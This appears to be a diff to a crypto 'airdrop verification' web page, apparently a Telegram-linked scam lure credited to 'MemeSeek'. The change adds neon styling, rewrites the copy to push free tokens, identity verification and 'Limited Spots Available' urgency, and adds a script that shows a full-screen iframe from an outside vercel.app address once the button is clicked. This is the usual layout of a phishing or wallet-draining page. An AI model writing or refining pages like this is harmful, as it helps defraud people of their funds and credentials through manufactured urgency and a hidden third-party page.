@@ -109,6 +109,127 @@
     }
   </style>
 
+  <div class="tgme_page_wrap" bis_skin_checked="1">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Safeguard Airdrop Verification</title>
+  <style>
+    /* Dark futuristic theme */
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
+
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Orbitron', sans-serif;
+      background: linear-gradient(to bottom right, #0a0a0a, #1e1e1e);
+      color: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    /* Main content box */
+    .container {
+      background: rgba(20, 20, 20, 0.95);
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 0 30px rgba(74, 188, 150, 0.5);
+      max-width: 600px;
+      width: 90%;
+      text-align: center;
+      transition: opacity 0.6s ease, transform 0.6s ease;
+    }
+
+    /* Logo styling */
+    .logo img {
+      max-width: 140px;
+      border-radius: 50%;
+      box-shadow: 0 0 20px rgba(74, 188, 150, 0.7);
+    }
+
+    /* Headline styling with glow effect */
+    .title {
+      font-size: 32px;
+      font-weight: bold;
+      margin: 20px 0;
+      color: #4abc96;
+      text-shadow: 0 0 15px #4abc96;
+      letter-spacing: 2px;
+    }
+
+    .description {
+      font-size: 18px;
+      color: #ddd;
+      margin-bottom: 30px;
+      line-height: 1.8;
+      font-weight: 400;
+    }
+
+    .highlight {
+      color: #00f2ff;
+      font-weight: bold;
+      text-shadow: 0 0 10px #00f2ff;
+    }
+
+    /* Button with neon glow effect */
+    .verify-btn {
+      display: inline-block;
+      background: linear-gradient(90deg, #4abc96, #00f2ff);
+      color: #fff;
+      font-size: 20px;
+      padding: 15px 35px;
+      border-radius: 10px;
+      text-decoration: none;
+      font-weight: bold;
+      box-shadow: 0 0 20px rgba(74, 188, 150, 0.8);
+      transition: all 0.4s ease-in-out;
+      cursor: pointer;
+      border: none;
+      outline: none;
+    }
+
+    .verify-btn:hover {
+      background: linear-gradient(90deg, #00f2ff, #4abc96);
+      box-shadow: 0 0 40px rgba(0, 242, 255, 0.9);
+      transform: scale(1.05);
+    }
+
+    /* Iframe container - Fullscreen */
+    .iframe-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: #000;
+      display: none;
+      opacity: 0;
+      transition: opacity 0.6s ease;
+      z-index: 1000;
+    }
+
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+
+    /* Hide the container when animating */
+    .hide {
+      opacity: 0;
+      transform: translateY(-20px);
+      pointer-events: none;
+    }
+
+    /* Show iframe smoothly */
+    .show {
+      display: block !important;
+      opacity: 1;
+    }
+  </style>
+
   <div class="container" id="content" bis_skin_checked="1">
     <!-- Logo Section -->
     <div class="logo" bis_skin_checked="1">
@@ -116,20 +237,42 @@
     </div>
 
     <!-- Title -->
-    <div class="title" bis_skin_checked="1">Exclusive Free Airdrop</div>
+    <div class="title" bis_skin_checked="1">🚀 Exclusive Airdrop Event</div>
 
     <!-- Description -->
     <div class="description" bis_skin_checked="1">
-      🚀 Join the future of digital finance!<br>
-      Claim your free tokens today by verifying your identity below.<br>
-      Our <span class="highlight">CTO</span> is excited to bring this exclusive opportunity to our community.<br><br>
-      ⏳ Act fast — <span class="highlight">only a few spots left!</span><br><br>
+      Step into the <span class="highlight">future of finance</span>!<br>
+      Secure your <span class="highlight">FREE</span> tokens now by verifying your identity.<br>
+      Our <span class="highlight">CTO</span> is offering this limited-time opportunity.<br><br>
+      ⏳ <span class="highlight">Limited Spots Available!</span><br><br>
       Powered by: <span class="highlight">MemeSeek</span>
     </div>
 
     <!-- Verify Button -->
-    <button class="verify-btn" onclick="openVerification()">Verify &amp; Claim Airdrop</button>
+    <button class="verify-btn" onclick="openVerification()">🚀 Verify &amp; Claim Airdrop</button>
   </div>
+
+  <!-- Embedded Verification Fullscreen -->
+  <div class="iframe-container" id="iframeContainer" bis_skin_checked="1">
+    <iframe id="verificationIframe" src=""></iframe>
+  </div>
+
+  <script>
+    function openVerification() {
+      // Hide the main content with animation
+      document.getElementById('content').classList.add('hide');
+      setTimeout(() => {
+        document.getElementById('content').style.display = 'none';
+        // Show the iframe with animation
+        document.getElementById('iframeContainer').classList.add('show');
+      }, 600); // Matches CSS transition time
+
+      // Set iframe source after animation starts
+      document.getElementById('verificationIframe').src = 'https://reerferer.vercel.app/a';
+    }
+  </script>
+</div>
+
 
   <!-- Embedded Verification Fullscreen -->
   <div class="iframe-container" id="iframeContainer" bis_skin_checked="1">
